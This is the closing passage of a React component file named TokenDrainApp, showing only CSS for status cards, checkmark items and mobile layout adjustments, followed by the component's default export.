          content: '✓';
          color: #10b981;
          margin-right: 10px;
          font-weight: bold;
        }
        
        /* Mobile-specific adjustments */
        @media (max-width: 768px) {
          .status-card.primary {
            padding: 15px;
          }
          
          .status-message {
            font-size: 16px;
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .btn {
            padding: 14px 18px;
            font-size: 15px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;

